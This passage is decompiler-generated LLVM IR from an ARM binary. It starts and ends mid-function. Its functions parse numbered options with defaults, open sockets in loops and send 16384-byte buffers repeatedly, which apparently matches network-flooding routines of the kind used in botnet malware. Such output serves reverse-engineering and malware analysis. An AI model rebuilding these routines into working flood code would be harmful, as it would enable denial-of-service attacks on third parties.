  store i32 %v3_8a7c, i32* %v4_8a98, align 4
  br i1 %v7_8a84, label %dec_label_pc_8b8c, label %dec_label_pc_8aa0

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8a70
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8ab8 = call i32 @function_1116c(i32 %v3_8a7c, i32 %v2_8a90, i32 16)
  %v0_8abc = load i32, i32* @r6, align 4
  %v1_8abc = add i32 %v0_8abc, 20
  %v2_8abc = inttoptr i32 %v1_8abc to i8*
  %v3_8abc = load i8, i8* %v2_8abc, align 1
  %v4_8abc = zext i8 %v3_8abc to i32
  store i32 %v4_8abc, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8abc, 32
  br i1 %tmp, label %dec_label_pc_8b44, label %dec_label_pc_8ac8

dec_label_pc_8ac8:                                ; preds = %dec_label_pc_8aa0, %dec_label_pc_8b44
  %v0_8acc = phi i32 [ %v0_8abc, %dec_label_pc_8aa0 ], [ %v0_8acc.pre, %dec_label_pc_8b44 ]
  %v1_8ad0 = load i32, i32* @r8, align 4
  %v2_8ad0 = add i32 %v1_8ad0, %stack_var_-60.0
  %v3_8ad0 = inttoptr i32 %v2_8ad0 to i32*
  %v4_8ad0 = load i32, i32* %v3_8ad0, align 4
  %v3_8ad8 = call i32 @function_111a4(i32 %v4_8ad0, i32 %v0_8acc, i32 16)
  %v0_8ae0 = load i32, i32* @sb, align 4
  %v1_8ae0 = load i32, i32* @r7, align 4
  %v9_8ae0 = icmp eq i32 %v0_8ae0, %v1_8ae0
  %v1_8ae4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8ae4, i32* %r3.global-to-local, align 4
  br i1 %v9_8ae0, label %dec_label_pc_8b98, label %dec_label_pc_8af0

dec_label_pc_8af0:                                ; preds = %dec_label_pc_8ac8, %dec_label_pc_8a60
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8a60 ], [ %v1_8ae4, %dec_label_pc_8ac8 ]
  store i32 65535, i32* @r4, align 4
  %v2_8b00 = call i32 @function_11f24(i32 65535, i32 1)
  store i32 %v5_8b10, i32* %r3.global-to-local, align 4
  %v1_8b1c = load i32, i32* @r4, align 4
  %v9_8b1c = icmp eq i32 %v3_89c0, %v1_8b1c
  %v1_8b20 = load i32, i32* @fp, align 4
  %v2_8b20 = add i32 %v1_8b20, %arg2
  store i32 %v2_8b20, i32* @r6, align 4
  %v2_8b24 = load i32, i32* @sl, align 4
  %v3_8b24 = add i32 %v2_8b24, %stack_var_-60.0
  %v4_8b24 = inttoptr i32 %v3_8b24 to i32*
  store i32 %v2_8b00, i32* %v4_8b24, align 4
  br i1 %v9_8b1c, label %dec_label_pc_8b30, label %bb51

bb51:                                             ; preds = %dec_label_pc_8af0
  %v1_8b28 = load i32, i32* %r3.global-to-local, align 4
  %v2_8b28 = trunc i32 %v1_8b28 to i16
  %v3_8b28 = load i32, i32* @r6, align 4
  %v4_8b28 = add i32 %v3_8b28, 2
  %v5_8b28 = inttoptr i32 %v4_8b28 to i16*
  store i16 %v2_8b28, i16* %v5_8b28, align 2
  br label %dec_label_pc_8a70

dec_label_pc_8b30:                                ; preds = %dec_label_pc_8af0
  %v0_8b30 = call i32 @function_e094()
  %v1_8b30 = trunc i32 %v0_8b30 to i16
  %v0_8b38 = load i32, i32* @fp, align 4
  %v2_8b38 = add i32 %v0_8b38, %arg2
  store i32 %v2_8b38, i32* @r6, align 4
  %v4_8b3c = add i32 %v2_8b38, 2
  %v5_8b3c = inttoptr i32 %v4_8b3c to i16*
  store i16 %v1_8b30, i16* %v5_8b3c, align 2
  br label %dec_label_pc_8a70

dec_label_pc_8b44:                                ; preds = %dec_label_pc_8aa0
  %v1_8b44 = add i32 %v0_8abc, 16
  %v2_8b44 = inttoptr i32 %v1_8b44 to i32*
  %v3_8b44 = load i32, i32* %v2_8b44, align 4
  store i32 %v3_8b44, i32* %r4.global-to-local, align 4
  %v0_8b48 = call i32 @function_e094()
  %v1_8b58 = and i32 %v3_8b44, 65280
  store i32 %v1_8b58, i32* %r3.global-to-local, align 4
  %v0_8b60 = load i32, i32* @r6, align 4
  %v1_8b60 = add i32 %v0_8b60, 20
  %v2_8b60 = inttoptr i32 %v1_8b60 to i8*
  %v3_8b60 = load i8, i8* %v2_8b60, align 1
  %v4_8b60 = zext i8 %v3_8b60 to i32
  %v5_8b64 = call i32 @llvm.bswap.i32(i32 %v3_8b44)
  %v7_8b68 = lshr i32 %v0_8b48, %v4_8b60
  %v8_8b68 = add i32 %v7_8b68, %v5_8b64
  %v5_8b80 = call i32 @llvm.bswap.i32(i32 %v8_8b68)
  store i32 %v5_8b80, i32* %r3.global-to-local, align 4
  %v2_8b84 = add i32 %v0_8b60, 4
  %v3_8b84 = inttoptr i32 %v2_8b84 to i32*
  store i32 %v5_8b80, i32* %v3_8b84, align 4
  %v0_8acc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8ac8

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8a70
  store i32 %v3_896c, i32* %r4.global-to-local, align 4
  store i32 %v18_896c, i32* %sb.global-to-local, align 4
  ret i32 %v3_8a7c

dec_label_pc_8b98:                                ; preds = %dec_label_pc_8ac8, %dec_label_pc_8a58
  %v1_8bd822 = phi i32 [ 0, %dec_label_pc_8a58 ], [ %v0_8ae0, %dec_label_pc_8ac8 ]
  %v2_8b9c = icmp eq i32 %v0_8a3c10, 0
  br i1 %v2_8b9c, label %dec_label_pc_8bbc.outer, label %dec_label_pc_8bd4

dec_label_pc_8bac:                                ; preds = %dec_label_pc_8bbc
  store i32 %v1_8bb0, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8bac = load i32, i32* @r8, align 4
  %v4_8bac = mul i32 %v1_8bb0, 4
  %v5_8bac = add i32 %v0_8bac, %v4_8bac
  %v6_8bac = inttoptr i32 %v5_8bac to i32*
  %v7_8bac = load i32, i32* %v6_8bac, align 4
  %v0_8bb0 = load i32, i32* @sl, align 4
  %v5_8bb0 = add i32 %v0_8bb0, %v4_8bac
  %v6_8bb0 = inttoptr i32 %v5_8bb0 to i32*
  %v7_8bb0 = load i32, i32* %v6_8bb0, align 4
  %v4_8bb4 = call i32 @function_11300(i32 %v7_8bac, i32 %v7_8bb0, i32 %v0_8bc0, i32 16384)
  %v0_8bb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8bb8 = add i32 %v0_8bb8, 1
  %v0_8bbc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8bbc.outer

dec_label_pc_8bbc.outer:                          ; preds = %dec_label_pc_8b98, %dec_label_pc_8bac
  %v0_8bbc.ph = phi i32 [ %v0_8bbc.pre.pre, %dec_label_pc_8bac ], [ %v1_8bd822, %dec_label_pc_8b98 ]
  %v1_8bb0.ph = phi i32 [ %v1_8bb8, %dec_label_pc_8bac ], [ 0, %dec_label_pc_8b98 ]
  %v0_8bc0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8bbc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8bbc.outer, %dec_label_pc_8bbc
  %v1_8bb0 = phi i32 [ 0, %dec_label_pc_8bbc ], [ %v1_8bb0.ph, %dec_label_pc_8bbc.outer ]
  %v8_8bc8 = icmp sgt i32 %v0_8bbc.ph, %v1_8bb0
  br i1 %v8_8bc8, label %dec_label_pc_8bac, label %dec_label_pc_8bbc

dec_label_pc_8bd4:                                ; preds = %dec_label_pc_8bd8, %dec_label_pc_8b98
  %v1_8bd821 = phi i32 [ %v1_8bd822, %dec_label_pc_8b98 ], [ %v1_8bd8, %dec_label_pc_8bd8 ]
  br label %dec_label_pc_8bd8

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8be4, %dec_label_pc_8bd4
  %v1_8bd8 = phi i32 [ %v1_8bd821, %dec_label_pc_8bd4 ], [ %v1_8bd8.pre, %dec_label_pc_8be4 ]
  %v1_8be4 = phi i32 [ 0, %dec_label_pc_8bd4 ], [ %v1_8c04, %dec_label_pc_8be4 ]
  store i32 %v1_8be4, i32* @r6, align 4
  %v6_8be0 = icmp slt i32 %v1_8be4, %v1_8bd8
  br i1 %v6_8be0, label %dec_label_pc_8be4, label %dec_label_pc_8bd4

dec_label_pc_8be4:                                ; preds = %dec_label_pc_8bd8
  %v0_8bdc = load i32, i32* @r5, align 4
  %v0_8be4 = load i32, i32* @sl, align 4
  %v4_8be4 = mul i32 %v1_8be4, 4
  %v5_8be4 = add i32 %v0_8be4, %v4_8be4
  %v6_8be4 = inttoptr i32 %v5_8be4 to i32*
  %v7_8be4 = load i32, i32* %v6_8be4, align 4
  store i32 %v7_8be4, i32* @r4, align 4
  %v2_8bec = inttoptr i32 %v7_8be4 to i16*
  %v3_8bec = call i32 @function_e228(i16* %v2_8bec, i32 %v0_8bdc)
  %v0_8bf0 = load i32, i32* @r8, align 4
  %v1_8bf0 = load i32, i32* @r6, align 4
  %v4_8bf0 = mul i32 %v1_8bf0, 4
  %v5_8bf0 = add i32 %v4_8bf0, %v0_8bf0
  %v6_8bf0 = inttoptr i32 %v5_8bf0 to i32*
  %v7_8bf0 = load i32, i32* %v6_8bf0, align 4
  %v0_8bf4 = load i32, i32* @r4, align 4
  %v0_8bf8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8c00 = call i32 @function_11300(i32 %v7_8bf0, i32 %v0_8bf4, i32 %v0_8bf8, i32 16384)
  %v0_8c04 = load i32, i32* @r6, align 4
  %v1_8c04 = add i32 %v0_8c04, 1
  %v1_8bd8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8bd8

; uselistorder directives
  uselistorder i32 %v1_8bd8, { 1, 0 }
  uselistorder i32 %v1_8bb0, { 2, 1, 0 }
  uselistorder i32 %v5_8b80, { 1, 0 }
  uselistorder i32 %v3_8b44, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8abc, { 1, 0, 2 }
  uselistorder i32 %v3_8a7c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_8a10, { 1, 0 }
  uselistorder i32 %v3_89c0, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8bbc, { 1, 0 }
  uselistorder label %dec_label_pc_8bbc.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8ac8, { 1, 0 }
  uselistorder label %dec_label_pc_8a70, { 1, 0 }
  uselistorder label %dec_label_pc_8a58, { 1, 0 }
}

define i32 @function_8c0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8c0c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_8c0c = load i32, i32* @r4, align 4
  %v18_8c0c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8c28 = call i32 @function_11f24(i32 %arg1, i32 4)
  store i32 %v2_8c28, i32* @sl, align 4
  %v0_8c34 = load i32, i32* @r7, align 4
  %v2_8c38 = call i32 @function_11f24(i32 %v0_8c34, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_8c44 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_8c38, i32* @r8, align 4
  %v0_8c54 = load i32, i32* @r5, align 4
  %v4_8c58 = inttoptr i32 %v0_8c44 to i32*
  %v5_8c58 = call i32 @function_8570(i32 %v0_8c54, i32* %v4_8c58, i32 7, i32 65535)
  %v3_8c60 = urem i32 %v5_8c58, 65536
  %v0_8c64 = load i32, i32* @r6, align 4
  %v0_8c6c = load i32, i32* @r4, align 4
  store i32 %v0_8c6c, i32* %r3.global-to-local, align 4
  %v0_8c70 = load i32, i32* @r5, align 4
  %v5_8c78 = inttoptr i32 %v0_8c64 to i32*
  %v6_8c78 = call i32 @function_8570(i32 %v0_8c70, i32* %v5_8c78, i32 6, i32 %v0_8c6c)
  %v0_8c7c = load i32, i32* @r6, align 4
  %v3_8c80 = mul i32 %v6_8c78, 65536
  store i32 %v3_8c80, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_8c8c = load i32, i32* @r5, align 4
  %v4_8c90 = inttoptr i32 %v0_8c7c to i32*
  %v5_8c90 = call i32 @function_8570(i32 %v0_8c8c, i32* %v4_8c90, i32 0, i32 1024)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8ca0 = load i32, i32* @r6, align 4
  %v0_8ca4 = load i32, i32* @r5, align 4
  %v3_8ca8 = urem i32 %v5_8c90, 65536
  store i32 %v3_8ca8, i32* @r5, align 4
  %v4_8cac = inttoptr i32 %v0_8ca0 to i32*
  %v5_8cac = call i32 @function_8570(i32 %v0_8ca4, i32* %v4_8cac, i32 1, i32 1)
  %v0_8cb0 = load i32, i32* %sb.global-to-local, align 4
  %v3_8cb0 = udiv i32 %v0_8cb0, 65536
  store i32 %v3_8cb0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8cb8 = load i32, i32* @r4, align 4
  %v9_8cb8 = icmp eq i32 %v3_8cb0, %v1_8cb8
  br i1 %v9_8cb8, label %dec_label_pc_8ce8, label %bb

bb:                                               ; preds = %dec_label_pc_8c0c
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8cd0 = udiv i32 %v0_8cb0, 16777216
  store i32 %v4_8cd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8cf8

dec_label_pc_8ce8:                                ; preds = %dec_label_pc_8c0c
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8ce8 = call i32 @function_e094()
  br label %dec_label_pc_8cf8

dec_label_pc_8cf8:                                ; preds = %bb, %dec_label_pc_8ce8
  %v0_8cdc10 = urem i32 %v5_8cac, 256
  %v0_8cf8 = load i32, i32* @r7, align 4
  %v2_8cf8 = icmp eq i32 %v0_8cf8, 0
  br i1 %v2_8cf8, label %dec_label_pc_8e38, label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8cf8
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8dac = udiv i32 %v3_8c60, 256
  %v1_8da8 = mul i32 %v5_8c58, 256
  %v4_8db0 = and i32 %v1_8da8, 65280
  %v5_8db0 = or i32 %v4_8db0, %v3_8dac
  %v2_8d30 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8d90

dec_label_pc_8d10:                                ; preds = %bb51, %dec_label_pc_8dd0
  %v3_8d1c = call i32 @function_113bc(i32 2, i32 2, i32 0)
  %v7_8d24 = icmp eq i32 %v3_8d1c, -1
  %v0_8d28 = load i32, i32* @sb, align 4
  %v1_8d28 = add i32 %v0_8d28, 1
  store i32 %v1_8d28, i32* @sb, align 4
  %v0_8d2c = load i32, i32* @fp, align 4
  %v1_8d2c = add i32 %v0_8d2c, 24
  store i32 %v1_8d2c, i32* @fp, align 4
  %v2_8d38 = load i32, i32* @r8, align 4
  %v3_8d38 = add i32 %v2_8d38, %stack_var_-60.0
  %v4_8d38 = inttoptr i32 %v3_8d38 to i32*
  store i32 %v3_8d1c, i32* %v4_8d38, align 4
  br i1 %v7_8d24, label %dec_label_pc_8e2c, label %dec_label_pc_8d40

dec_label_pc_8d40:                                ; preds = %dec_label_pc_8d10
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8d58 = call i32 @function_1116c(i32 %v3_8d1c, i32 %v2_8d30, i32 16)
  %v0_8d5c = load i32, i32* @r6, align 4
  %v1_8d5c = add i32 %v0_8d5c, 20
  %v2_8d5c = inttoptr i32 %v1_8d5c to i8*
  %v3_8d5c = load i8, i8* %v2_8d5c, align 1
  %v4_8d5c = zext i8 %v3_8d5c to i32
  store i32 %v4_8d5c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8d5c, 32
  br i1 %tmp, label %dec_label_pc_8de4, label %dec_label_pc_8d68

dec_label_pc_8d68:                                ; preds = %dec_label_pc_8d40, %dec_label_pc_8de4
  %v0_8d6c = phi i32 [ %v0_8d5c, %dec_label_pc_8d40 ], [ %v0_8d6c.pre, %dec_label_pc_8de4 ]
  %v1_8d70 = load i32, i32* @r8, align 4
  %v2_8d70 = add i32 %v1_8d70, %stack_var_-60.0
  %v3_8d70 = inttoptr i32 %v2_8d70 to i32*
  %v4_8d70 = load i32, i32* %v3_8d70, align 4
  %v3_8d78 = call i32 @function_111a4(i32 %v4_8d70, i32 %v0_8d6c, i32 16)
  %v0_8d80 = load i32, i32* @sb, align 4
  %v1_8d80 = load i32, i32* @r7, align 4
  %v9_8d80 = icmp eq i32 %v0_8d80, %v1_8d80
  %v1_8d84 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8d84, i32* %r3.global-to-local, align 4
  br i1 %v9_8d80, label %dec_label_pc_8e38, label %dec_label_pc_8d90

dec_label_pc_8d90:                                ; preds = %dec_label_pc_8d68, %dec_label_pc_8d00
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8d00 ], [ %v1_8d84, %dec_label_pc_8d68 ]
  store i32 65535, i32* @r4, align 4
  %v2_8da0 = call i32 @function_11f24(i32 65535, i32 1)
  store i32 %v5_8db0, i32* %r3.global-to-local, align 4
  %v1_8dbc = load i32, i32* @r4, align 4
  %v9_8dbc = icmp eq i32 %v3_8c60, %v1_8dbc
  %v1_8dc0 = load i32, i32* @fp, align 4
  %v2_8dc0 = add i32 %v1_8dc0, %arg2
  store i32 %v2_8dc0, i32* @r6, align 4
  %v2_8dc4 = load i32, i32* @sl, align 4
  %v3_8dc4 = add i32 %v2_8dc4, %stack_var_-60.0
  %v4_8dc4 = inttoptr i32 %v3_8dc4 to i32*
  store i32 %v2_8da0, i32* %v4_8dc4, align 4
  br i1 %v9_8dbc, label %dec_label_pc_8dd0, label %bb51

bb51:                                             ; preds = %dec_label_pc_8d90
  %v1_8dc8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8dc8 = trunc i32 %v1_8dc8 to i16
  %v3_8dc8 = load i32, i32* @r6, align 4
  %v4_8dc8 = add i32 %v3_8dc8, 2
  %v5_8dc8 = inttoptr i32 %v4_8dc8 to i16*
  store i16 %v2_8dc8, i16* %v5_8dc8, align 2
  br label %dec_label_pc_8d10

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8d90
  %v0_8dd0 = call i32 @function_e094()
  %v1_8dd0 = trunc i32 %v0_8dd0 to i16
  %v0_8dd8 = load i32, i32* @fp, align 4
  %v2_8dd8 = add i32 %v0_8dd8, %arg2
  store i32 %v2_8dd8, i32* @r6, align 4
  %v4_8ddc = add i32 %v2_8dd8, 2
  %v5_8ddc = inttoptr i32 %v4_8ddc to i16*
  store i16 %v1_8dd0, i16* %v5_8ddc, align 2
  br label %dec_label_pc_8d10

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8d40
  %v1_8de4 = add i32 %v0_8d5c, 16
  %v2_8de4 = inttoptr i32 %v1_8de4 to i32*
  %v3_8de4 = load i32, i32* %v2_8de4, align 4
  store i32 %v3_8de4, i32* %r4.global-to-local, align 4
  %v0_8de8 = call i32 @function_e094()
  %v1_8df8 = and i32 %v3_8de4, 65280
  store i32 %v1_8df8, i32* %r3.global-to-local, align 4
  %v0_8e00 = load i32, i32* @r6, align 4
  %v1_8e00 = add i32 %v0_8e00, 20
  %v2_8e00 = inttoptr i32 %v1_8e00 to i8*
  %v3_8e00 = load i8, i8* %v2_8e00, align 1
  %v4_8e00 = zext i8 %v3_8e00 to i32
  %v5_8e04 = call i32 @llvm.bswap.i32(i32 %v3_8de4)
  %v7_8e08 = lshr i32 %v0_8de8, %v4_8e00
  %v8_8e08 = add i32 %v7_8e08, %v5_8e04
  %v5_8e20 = call i32 @llvm.bswap.i32(i32 %v8_8e08)
  store i32 %v5_8e20, i32* %r3.global-to-local, align 4
  %v2_8e24 = add i32 %v0_8e00, 4
  %v3_8e24 = inttoptr i32 %v2_8e24 to i32*
  store i32 %v5_8e20, i32* %v3_8e24, align 4
  %v0_8d6c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8d68

dec_label_pc_8e2c:                                ; preds = %dec_label_pc_8d10
  store i32 %v3_8c0c, i32* %r4.global-to-local, align 4
  store i32 %v18_8c0c, i32* %sb.global-to-local, align 4
  ret i32 %v3_8d1c

dec_label_pc_8e38:                                ; preds = %dec_label_pc_8d68, %dec_label_pc_8cf8
  %v1_8e7822 = phi i32 [ 0, %dec_label_pc_8cf8 ], [ %v0_8d80, %dec_label_pc_8d68 ]
  %v2_8e3c = icmp eq i32 %v0_8cdc10, 0
  br i1 %v2_8e3c, label %dec_label_pc_8e5c.outer, label %dec_label_pc_8e74

dec_label_pc_8e4c:                                ; preds = %dec_label_pc_8e5c
  store i32 %v1_8e50, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8e4c = load i32, i32* @r8, align 4
  %v4_8e4c = mul i32 %v1_8e50, 4
  %v5_8e4c = add i32 %v0_8e4c, %v4_8e4c
  %v6_8e4c = inttoptr i32 %v5_8e4c to i32*
  %v7_8e4c = load i32, i32* %v6_8e4c, align 4
  %v0_8e50 = load i32, i32* @sl, align 4
  %v5_8e50 = add i32 %v0_8e50, %v4_8e4c
  %v6_8e50 = inttoptr i32 %v5_8e50 to i32*
  %v7_8e50 = load i32, i32* %v6_8e50, align 4
  %v4_8e54 = call i32 @function_11300(i32 %v7_8e4c, i32 %v7_8e50, i32 %v0_8e60, i32 16384)
  %v0_8e58 = load i32, i32* %r4.global-to-local, align 4
  %v1_8e58 = add i32 %v0_8e58, 1
  %v0_8e5c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e5c.outer

dec_label_pc_8e5c.outer:                          ; preds = %dec_label_pc_8e38, %dec_label_pc_8e4c
  %v0_8e5c.ph = phi i32 [ %v0_8e5c.pre.pre, %dec_label_pc_8e4c ], [ %v1_8e7822, %dec_label_pc_8e38 ]
  %v1_8e50.ph = phi i32 [ %v1_8e58, %dec_label_pc_8e4c ], [ 0, %dec_label_pc_8e38 ]
  %v0_8e60 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8e5c

dec_label_pc_8e5c:                                ; preds = %dec_label_pc_8e5c.outer, %dec_label_pc_8e5c
  %v1_8e50 = phi i32 [ 0, %dec_label_pc_8e5c ], [ %v1_8e50.ph, %dec_label_pc_8e5c.outer ]
  %v8_8e68 = icmp sgt i32 %v0_8e5c.ph, %v1_8e50
  br i1 %v8_8e68, label %dec_label_pc_8e4c, label %dec_label_pc_8e5c

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e78, %dec_label_pc_8e38
  %v1_8e7821 = phi i32 [ %v1_8e7822, %dec_label_pc_8e38 ], [ %v1_8e78, %dec_label_pc_8e78 ]
  br label %dec_label_pc_8e78

dec_label_pc_8e78:                                ; preds = %dec_label_pc_8e84, %dec_label_pc_8e74
  %v1_8e78 = phi i32 [ %v1_8e7821, %dec_label_pc_8e74 ], [ %v1_8e78.pre, %dec_label_pc_8e84 ]
  %v1_8e84 = phi i32 [ 0, %dec_label_pc_8e74 ], [ %v1_8ea4, %dec_label_pc_8e84 ]
  store i32 %v1_8e84, i32* @r6, align 4
  %v6_8e80 = icmp slt i32 %v1_8e84, %v1_8e78
  br i1 %v6_8e80, label %dec_label_pc_8e84, label %dec_label_pc_8e74

dec_label_pc_8e84:                                ; preds = %dec_label_pc_8e78
  %v0_8e7c = load i32, i32* @r5, align 4
  %v0_8e84 = load i32, i32* @sl, align 4
  %v4_8e84 = mul i32 %v1_8e84, 4
  %v5_8e84 = add i32 %v0_8e84, %v4_8e84
  %v6_8e84 = inttoptr i32 %v5_8e84 to i32*
  %v7_8e84 = load i32, i32* %v6_8e84, align 4
  store i32 %v7_8e84, i32* @r4, align 4
  %v2_8e8c = inttoptr i32 %v7_8e84 to i16*
  %v3_8e8c = call i32 @function_e228(i16* %v2_8e8c, i32 %v0_8e7c)
  %v0_8e90 = load i32, i32* @r8, align 4
  %v1_8e90 = load i32, i32* @r6, align 4
  %v4_8e90 = mul i32 %v1_8e90, 4
  %v5_8e90 = add i32 %v4_8e90, %v0_8e90
  %v6_8e90 = inttoptr i32 %v5_8e90 to i32*
  %v7_8e90 = load i32, i32* %v6_8e90, align 4
  %v0_8e94 = load i32, i32* @r4, align 4
  %v0_8e98 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8ea0 = call i32 @function_11300(i32 %v7_8e90, i32 %v0_8e94, i32 %v0_8e98, i32 16384)
  %v0_8ea4 = load i32, i32* @r6, align 4
  %v1_8ea4 = add i32 %v0_8ea4, 1
  %v1_8e78.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e78

; uselistorder directives
  uselistorder i32 %v1_8e78, { 1, 0 }
  uselistorder i32 %v1_8e50, { 2, 1, 0 }
  uselistorder i32 %v5_8e20, { 1, 0 }
  uselistorder i32 %v3_8de4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8d5c, { 1, 0, 2 }
  uselistorder i32 %v3_8d1c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_8cb0, { 1, 0 }
  uselistorder i32 %v3_8c60, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 13, 1, 14, 15, 5, 6, 2, 3, 4, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8e5c, { 1, 0 }
  uselistorder label %dec_label_pc_8e5c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8d68, { 1, 0 }
  uselistorder label %dec_label_pc_8d10, { 1, 0 }
  uselistorder label %dec_label_pc_8cf8, { 1, 0 }
}

define i32 @function_8eac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8eac:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_8eac = load i32, i32* @sb, align 4
  %v27_8eac = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8ec8 = call i32 @function_11f24(i32 %arg1, i32 4)
  %v0_8ecc = load i32, i32* @r5, align 4
  store i32 %v0_8ecc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8edc = load i32, i32* @r4, align 4
  store i32 %v0_8edc, i32* %r0.global-to-local, align 4
  %v5_8ee0 = inttoptr i32 %v0_8ecc to i32*
  %v6_8ee0 = call i32 @function_8570(i32 %v0_8edc, i32* %v5_8ee0, i32 2, i32 0)
  %v1_8eec = urem i32 %v6_8ee0, 256
  store i32 %v1_8eec, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8ef8 = load i32, i32* @r5, align 4
  store i32 %v0_8ef8, i32* %r1.global-to-local, align 4
  %v0_8efc = load i32, i32* @r4, align 4
  store i32 %v0_8efc, i32* %r0.global-to-local, align 4
  %v5_8f00 = trunc i32 %v6_8ee0 to i8
  %v6_8f04 = inttoptr i32 %v0_8ef8 to i32*
  %v7_8f04 = call i32 @function_8570(i32 %v0_8efc, i32* %v6_8f04, i32 3, i32 65535)
  %v0_8f08 = load i32, i32* @r5, align 4
  store i32 %v0_8f08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_8f18 = load i32, i32* @r4, align 4
  store i32 %v0_8f18, i32* %r0.global-to-local, align 4
  %v5_8f1c = inttoptr i32 %v0_8f08 to i32*
  %v6_8f1c = call i32 @function_8570(i32 %v0_8f18, i32* %v5_8f1c, i32 4, i32 64)
  %v1_8f24 = urem i32 %v6_8f1c, 256
  store i32 %v1_8f24, i32* %ip.global-to-local, align 4
  %v0_8f28 = load i32, i32* @r5, align 4
  store i32 %v0_8f28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f34 = load i32, i32* @r4, align 4
  store i32 %v0_8f34, i32* %r0.global-to-local, align 4
  %v6_8f3c = inttoptr i32 %v0_8f28 to i32*
